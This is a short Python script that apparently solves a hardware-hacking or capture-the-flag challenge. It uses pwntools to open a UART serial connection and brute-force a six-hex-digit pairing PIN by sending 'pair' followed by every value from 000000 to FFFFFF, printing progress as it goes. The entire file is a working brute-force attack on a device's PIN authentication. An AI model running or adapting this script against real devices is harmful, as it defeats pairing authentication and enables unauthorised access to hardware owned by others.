#!/usr/bin/python3

import argparse
from pwn import *
import random
import sys

parser = argparse.ArgumentParser()
parser.add_argument("uart0_serial_file_name")
parser.add_argument("-s", "--start-pin", type=lambda x: int(x, 16), default=0x000000)
parser.add_argument("-e", "--stop-pin", type=lambda x: int(x, 16), default=0xFFFFFF)
args = parser.parse_args()

io = serialtube(args.uart0_serial_file_name, convert_newlines=False)

for pin in range(args.start_pin, args.stop_pin + 1):
    pin_str = f"{pin:06x}"
    io.send(f"pair{pin_str}\n".encode())
    if pin % 0x1000 == 0:
        print(f"Current PIN: {pin_str}")
